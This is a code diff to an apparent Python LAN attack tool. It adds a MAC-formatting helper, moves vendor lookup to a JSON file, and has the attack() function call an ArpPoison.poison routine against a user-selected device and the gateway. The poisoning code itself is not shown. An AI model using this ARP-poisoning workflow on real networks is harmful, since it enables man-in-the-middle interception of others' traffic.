@@ -2,8 +2,13 @@ from cmd_line_args import args
 import scanner
 import curses
 import atexit
-
+from poision import ArpPoison
 import subprocess
+import json
+
+
+def format_mac(address: str) -> str:
+    return ':'.join(address[i:i+2] for i in range(0, len(address), 2))
 
 
 def get_arp_table():
@@ -25,12 +30,13 @@ def get_arp_table():
 
 
 def get_vendor(mac) -> str:
-    with open("mac-vendor.txt", "r", encoding="utf-8") as file:
-        for line in file:
-            addr, vendor = line.split(maxsplit=1)
-            if addr.lower() == mac[:6]:
-                return vendor
-    return "unknown"
+    mac = format_mac(mac)[:8]
+    with open("mac-vendor.json", "r", encoding="utf-8") as file:
+        vendors = json.load(file)
+    for vendor in vendors["VendorMapping"]:
+        if vendor["_mac_prefix"] == mac:
+            return vendor["_vendor_name"]
+    return "Unknown Vendor"
 
 
 def selection(devices):
@@ -105,3 +111,6 @@ def attack() -> None:
     selected_device = selection(devices)
 
     print("\n[*]Selected device:", selected_device)
+
+    ArpPoison.poison(
+        local_mac, selected_device[0], selected_device[1], gateway_ip, gateway_mac)
